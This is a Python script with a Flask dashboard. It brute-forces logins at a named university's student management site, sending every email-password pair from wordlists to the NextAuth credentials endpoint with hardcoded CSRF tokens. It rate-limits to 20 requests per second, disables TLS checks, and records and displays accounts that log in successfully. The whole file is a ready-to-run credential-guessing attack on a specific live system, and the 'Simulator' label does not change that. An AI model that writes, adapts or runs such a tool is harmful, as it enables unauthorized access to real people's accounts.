import asyncio
import aiohttp
import os
import json
import random
from urllib.parse import urlparse, quote
from flask import Flask, Response, request, jsonify
import threading
import time

# =======================
# Config
# =======================
target_base = "https://sms.mzuni.ac.mw"  # target URL
proxychoice = "no"                     # "yes" = use 127.0.0.1:8080, "no" = direct
proxy_url = "http://127.0.0.1:8080"
emails_file = "emails.txt"
passwords_file = "passwords.txt"
log_file = "log.json"
rate_limit = 20  # requests per second
# =======================

# Hardcoded values from the working template
CSRF_TOKEN = "d9c1f04f4c6278d5a68941ada332897224c22f4848b946ffcac940a4a0984964"
CSRF_COOKIE = "d9c1f04f4c6278d5a68941ada332897224c22f4848b946ffcac940a4a0984964%7C3092d24913e257b40ed49c4dab9f382e68f3812ae12b0ebd1abec2e2b3e29829"
CALLBACK_URL = "https%3A%2F%2Fsms.mzuni.ac.mw%2Flogin"

# Global variables for controlling the brute force process
brute_force_tasks = []
brute_force_running = False
successful_attempts = []
event_queue = asyncio.Queue()
browser_output_count = 0  # Counter for browser output

# Flask app
app = Flask(__name__)

# Progress log management
def load_progress():
    progress_data = {
        "attempted_combinations": set(),
        "successful_combinations": []
    }
    
    if os.path.exists(log_file):
        try:
            with open(log_file, "r") as f:
                data = json.load(f)
                progress_data["attempted_combinations"] = set(data.get("attempted_combinations", []))
                progress_data["successful_combinations"] = data.get("successful_combinations", [])
        except:
            # If file is corrupted, start fresh
            pass
            
    return progress_data


def save_progress(email, password, success=False):
    progress_data = load_progress()
    combination = f"{email}:{password}"
    
    # Add to attempted combinations
    progress_data["attempted_combinations"].add(combination)
    
    # If successful, add to successful list
    if success and combination not in [s["combination"] for s in progress_data["successful_combinations"]]:
        progress_data["successful_combinations"].append({
            "combination": combination,
            "email": email,
            "password": password,
            "timestamp": time.time()
        })
    
    # Save to file
    with open(log_file, "w") as f:
        json.dump({
            "attempted_combinations": list(progress_data["attempted_combinations"]),
            "successful_combinations": progress_data["successful_combinations"]
        }, f, indent=2)


async def send_event(msg: str):
    global browser_output_count
    # Print to terminal
    print(msg)
    # Add to event queue for browser
    await event_queue.put(msg)
    browser_output_count += 1


# Worker to brute force one email against all passwords
async def brute_email(session, sem, email, passwords, progress_data):
    for pwd in passwords:
        combination = f"{email}:{pwd}"
        
        # Check if we should stop
        if not brute_force_running:
            await send_event(f"[STOPPED] {email}:{pwd}")
            return
            
        # Skip if already attempted
        if combination in progress_data["attempted_combinations"]:
            await send_event(f"[SKIP] Already attempted: {email}:{pwd}")
            continue
            
        await sem.acquire()
        try:
            # URL-encoded form data (exactly like the working template)
            data_str = f"redirect=false&email={quote(email)}&password={quote(pwd)}&csrfToken={CSRF_TOKEN}&callbackUrl={CALLBACK_URL}&json=true"
            
            cookies = {
                '__Host-next-auth.csrf-token': CSRF_COOKIE,
                '__Secure-next-auth.callback-url': CALLBACK_URL,
            }
            
            headers = {
                'Host': 'sms.mzuni.ac.mw',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6178.0 Safari/537.36',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://sms.mzuni.ac.mw',
                'Referer': 'https://sms.mzuni.ac.mw/login',
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive',
            }
            
            proxy_arg = proxy_url if proxychoice.lower() == "yes" else None
            
            # Send POST request (exactly like the working template)
            async with session.post(
                'https://sms.mzuni.ac.mw/api/auth/callback/credentials',
                cookies=cookies,
                headers=headers,
                data=data_str,
                proxy=proxy_arg,
                timeout=10,
                ssl=False
            ) as resp:
                status = resp.status
                response_text = await resp.text()
                
                if status == 200:
                    await send_event(f"[SUCCESS] {email}:{pwd}")
                    save_progress(email, pwd, success=True)
                    successful_attempts.append(f"{email}:{pwd}")
                elif status == 401:
                    await send_event(f"[FAIL] {email}:{pwd}")
                    save_progress(email, pwd, success=False)
                else:
                    await send_event(f"[INTERESTING {status}] {email}:{pwd} - Response: {response_text[:100]}")
                    save_progress(email, pwd, success=False)
                    
        except Exception as e:
            await send_event(f"[ERROR] {email}:{pwd} -> {e}")
            save_progress(email, pwd, success=False)
        finally:
            await asyncio.sleep(1 / rate_limit)
            sem.release()


# Main brute logic
async def brute_main():
    global brute_force_running, brute_force_tasks, browser_output_count
    brute_force_running = True
    
    # Load inputs
    if not os.path.exists(emails_file):
        await send_event(f"[ERROR] Emails file '{emails_file}' not found")
        brute_force_running = False
        return
        
    if not os.path.exists(passwords_file):
        await send_event(f"[ERROR] Passwords file '{passwords_file}' not found")
        brute_force_running = False
        return
        
    with open(emails_file) as f:
        emails = [line.strip() for line in f if line.strip()]
    with open(passwords_file) as f:
        passwords = [line.strip() for line in f if line.strip()]

    progress_data = load_progress()
    
    # Count how many combinations we've already attempted
    attempted_count = len(progress_data["attempted_combinations"])
    total_combinations = len(emails) * len(passwords)
    remaining = total_combinations - attempted_count
    
    if remaining <= 0:
        await send_event("[INFO] All combinations already attempted.")
        brute_force_running = False
        return

    await send_event(f"[INFO] Starting attack. Already attempted: {attempted_count}/{total_combinations}")
    await send_event(f"[INFO] Remaining combinations: {remaining}")
    await send_event(f"[INFO] Successful so far: {len(progress_data['successful_combinations'])}")
    await send_event(f"[INFO] Using hardcoded CSRF token: {CSRF_TOKEN}")

    sem = asyncio.Semaphore(rate_limit)
    connector = aiohttp.TCPConnector(ssl=False, limit=0)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for email in emails:
            if not brute_force_running:
                break
            task = asyncio.create_task(brute_email(session, sem, email, passwords, progress_data))
            tasks.append(task)
            brute_force_tasks.append(task)
        
        await asyncio.gather(*tasks, return_exceptions=True)
    
    brute_force_running = False
    await send_event("[INFO] Brute force completed")


# Stop the brute force process
async def stop_brute():
    global brute_force_running, brute_force_tasks
    brute_force_running = False
    
    # Cancel all running tasks
    for task in brute_force_tasks:
        if not task.done():
            task.cancel()
    
    brute_force_tasks = []
    await send_event("[INFO] Brute force stopped by user")


def run_async_task(coro):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(coro)
    loop.close()


# =======================
# Flask Routes
# =======================

@app.route('/')
def index():
    # Load successful attempts for display
    progress_data = load_progress()
    success_list = "\n".join([f"<li>{s['combination']}</li>" for s in progress_data["successful_combinations"]])
    success_count = len(progress_data["successful_combinations"])
    
    return f"""
<!DOCTYPE html>
<html>
<head>
  <title>Brute Forcer</title>
  <style>
    body {{ font-family: Arial, sans-serif; margin: 20px; }}
    button {{ padding: 10px 20px; font-size: 16px; margin-bottom: 20px; margin-right: 10px; }}
    .start {{ background-color: #4CAF50; color: white; }}
    .stop {{ background-color: #f44336; color: white; }}
    .container {{ display: flex; gap: 20px; }}
    .output, .success {{ 
        background: #f4f4f4; 
        padding: 10px; 
        border: 1px solid #ddd; 
        height: 500px; 
        overflow-y: auto;
        flex: 1;
    }}
    .success {{ background: #e8f5e9; }}
    h3 {{ margin-top: 0; }}
  </style>
</head>
<body>
  <h2>Clusterbomb Brute Force Simulator</h2>
  <button class="start" onclick="startBrute()">Start Brute Force</button>
  <button class="stop" onclick="stopBrute()">Stop Brute Force</button>
  
  <div class="container">
    <div class="output">
      <h3>Attack Log</h3>
      <pre id="out"></pre>
    </div>
    
    <div class="success">
      <h3>Successful Attempts ({success_count})</h3>
      <ul id="success-list">
        {success_list}
      </ul>
    </div>
  </div>
  
  <script>
    const out = document.getElementById('out');
    const successList = document.getElementById('success-list');
    let eventSource = null;
    let outputCount = 0;
    const MAX_OUTPUT_LINES = 60;
    
    function startBrute() {{
      // Stop any existing connection
      if (eventSource) {{
        eventSource.close();
      }}
      
      fetch('/start');
      eventSource = new EventSource('/events');
      eventSource.onmessage = e => {{
        const data = e.data;
        
        // Clear output if we've reached the limit
        if (outputCount >= MAX_OUTPUT_LINES) {{
          out.textContent = "";
          outputCount = 0;
        }}
        
        out.textContent += data + "\\n";
        out.scrollTop = out.scrollHeight;
        outputCount++;
        
        // If it's a success, add to the success list
        if (data.includes('[SUCCESS]')) {{
          const combination = data.split('[SUCCESS] ')[1];
          const li = document.createElement('li');
          li.textContent = combination;
          successList.appendChild(li);
        }}
      }};
    }}
    
    function stopBrute() {{
      fetch('/stop');
      if (eventSource) {{
        eventSource.close();
        eventSource = null;
      }}
    }}
    
    // Auto-start if we were previously running (after page refresh)
    window.onload = function() {{
      fetch('/status')
        .then(response => response.json())
        .then(data => {{
          if (data.running) {{
            startBrute();
          }}
        }});
    }};
  </script>
</body>
</html>
"""


@app.route('/start')
def start_brute():
    if not brute_force_running:
        thread = threading.Thread(target=run_async_task, args=(brute_main(),))
        thread.daemon = True
        thread.start()
        return "started"
    return "already running"


@app.route('/stop')
def stop_brute():
    thread = threading.Thread(target=run_async_task, args=(stop_brute(),))
    thread.daemon = True
    thread.start()
    return "stopping"


@app.route('/events')
def events():
    def generate():
        while True:
            try:
                # Use asyncio to get events from the queue
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                msg = loop.run_until_complete(event_queue.get())
                loop.close()
                yield f"data: {msg}\n\n"
            except:
                time.sleep(0.1)
                continue
    
    return Response(generate(), mimetype='text/event-stream')


@app.route('/status')
def status():
    progress_data = load_progress()
    return jsonify({
        "running": brute_force_running,
        "successful": len(progress_data["successful_combinations"]),
        "attempted": len(progress_data["attempted_combinations"])
    })


if __name__ == "__main__":
    # Use a random port for security
    port = 5500
    print(f"Starting Flask app on port {port}")
    app.run(host='0.0.0.0', port=port, debug=False)